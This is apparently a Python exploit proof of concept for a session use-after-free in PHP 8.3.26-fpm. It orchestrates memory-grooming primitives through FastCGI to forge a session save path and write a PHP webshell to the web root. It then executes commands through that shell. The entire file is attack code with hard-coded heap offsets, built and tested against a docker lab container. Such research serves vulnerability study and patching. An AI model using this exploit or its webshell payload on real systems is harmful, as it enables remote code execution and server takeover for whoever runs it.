#!/usr/bin/env python3 -I
# INDEX: single-request session-uaf file-write rce | fpm | other(docker-exec arm) | session_start() | minor+ | armed worker, 8.3.26
"""Single-request sink-free session-UAF -> file-write RCE on PHP 8.3.26-fpm
(reference build). Lands uid=33 pure-HTTP for the stage, no runtime gdb,
no multi-stage re-arm.

Composition (CVE-2026-109619; thin orchestration over the primitives): an armed worker has a
dangling BG(unserialize). One stage POST (write.basedir_write_stage) re-occupies the freed
var_entries/var_dtor_entries blocks with a carrier built from write.high_dt_slot_placement (fake
basedir backing at a high DT slot that survives php_session_encode) + write.ps_files_basedir_forge
(the two-push aim at ps_files->{last_key, basedir}); a trailing $_FILES part's FILE_START flush
writes the session -- a webshell in an upload_progress key -- to the forged NUL-truncated path.
oracles.upload_progress_output reads back GET x.php?0=<cmd>.

Why one request suffices: ps_files->basedir = &DT->data[S+1], whose backing {len, path} lives in the
freed DT region. php_session_flush -> php_session_encode reallocates the LOW DT slots before
ps_files_open() reads basedir, so the fake backing must sit at a HIGH slot (DT->used_slots=S, backing
at data[S+2]); S=50 clears the encode's allocations ({0,20,80,120,200} collide). Worker survives.

Offsets (128M arm, chunk-relative, K-free): E_OFF=0x8f000 DT_OFF=0x6a000 ps_files=K+0x56208;
AIM = (ps_files - E - 0x10)/8 = -29121; the carrier first-fits at DT via 4 tiny prefix fields.
512M needs the inherited arm re-calibration.

Lab stand-ins (inherited; NOT the write-delivery): the arm session file is built by genA_big.php
(docker exec) -- the real attack accumulates it via upload-progress POSTs
(groom.upload_progress_accumulate) -- and sess_zc is a trivial 2-int normal session write. The
the reference rig is torn down, so this is kept for structural reference and is not runtime-verifiable.
"""
import os
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import common.fcgi as fcgi  # FastCGI transport  # noqa: E402
from primitives.write import ps_files_basedir_forge as forge  # noqa: E402
from primitives.geometry import carrier_e_gap  # noqa: E402
from primitives.write import high_dt_slot_placement  # noqa: E402
from primitives.write.basedir_write_stage import stage_parts  # noqa: E402
from primitives.oracles.upload_progress_output import webshell_output  # noqa: E402

C = os.environ.get("REF_CONT", "ref-fpm128")
PORT = int(os.environ.get("REF_PORT", "9056"))
SZ = 262144
NFIELD = 4
FLEN = 100
FSIZE = 5000
S = int(os.environ.get("CP_S", "50"))
E_OFF, PS_FILES_OFF = 0x8f000, 0x56208
DT_OFF = carrier_e_gap.dt_from_e(E_OFF, "dt_high_slot")   # 0x6a000
CARRIER_E = carrier_e_gap.carrier_e("dt_high_slot")       # 0x25000
AIM_U = forge.aim_used_slots(PS_FILES_OFF, E_OFF)         # -29121
WEBPATH = os.environ.get("CP_PATH", "/var/www/html/x.php").encode() + b"\x00"
SHELL = b"<?php system($_GET[0]);?>"
CMD = os.environ.get("CP_CMD", "id")


def sh(c):
    return subprocess.run(["docker", "exec", C, "sh", "-c", c], capture_output=True, text=True)


def wpid():
    return sh('for p in /proc/[0-9]*; do [ -r "$p/cmdline" ]&&tr "\\0" "\\n" <"$p/cmdline" '
              '2>/dev/null|head -1|grep -q pool&&{ echo ${p#/proc/};break;};done').stdout.strip()


def build_carrier():
    """Carrier for the armed worker: high-DT-slot placement of the fake basedir backing (survives
    php_session_encode) + the two-push aim at ps_files->{last_key, basedir}."""
    car = bytearray(SZ)
    high_dt_slot_placement.place(car, WEBPATH, s=S)
    forge.aim_pushes(car, CARRIER_E, AIM_U)
    return bytes(car)


def main():
    # --- fresh worker + arm session file (stand-ins; see header) ---
    sh("kill -9 %s 2>/dev/null" % wpid()); fcgi.wait_up(PORT)
    sh("rm -f /sess/sess_asx /sess/sess_zc " + WEBPATH[:-1].decode())
    subprocess.run(["docker", "exec", C, "php", "-d", "memory_limit=-1", "/genA_big.php",
                    "asx", "100", "20", "4000000"], capture_output=True)
    # --- ARM: session_start on the big session -> OOM -> pre-RINIT var_hash dangle ---
    fcgi.get(PORT, "arm.php", qs="sid=asx", cookie="PHPSESSID=asx")
    # --- PRIME: 2-scalar session for the stage sid (a normal session write in a real attack) ---
    subprocess.run(["docker", "exec", "-i", C, "sh", "-c", "cat > /sess/sess_zc"],
                   input=b"a|i:0;b|i:0;", capture_output=True); sh("chmod 666 /sess/sess_zc")

    # --- STAGE: single upload-progress POST. The FILE_START update decodes sess_zc (forge),
    #     the flush writes the shell. ---
    parts = stage_parts(build_carrier(), SHELL, nfield=NFIELD, flen=FLEN, fsize=FSIZE)
    try:
        fcgi.post_multipart(PORT, "plain.php", parts, cookie="PHPSESSID=zc")
    except Exception as e:
        print("post err", e)
    time.sleep(0.3)

    ls = sh("ls -la " + WEBPATH[:-1].decode() + " 2>&1").stdout.strip()
    print("dropped:", ls[:70])
    if "No such" in ls:
        print("MISS (arm probabilistic -- retry)"); sys.exit(1)
    out = fcgi.get(PORT, os.path.basename(WEBPATH[:-1].decode()), qs="0=" + CMD)
    print("=== webshell cmd=%r output ===" % CMD)
    print(webshell_output(out, tail=b"|a:5")[:400])


if __name__ == "__main__":
    main()
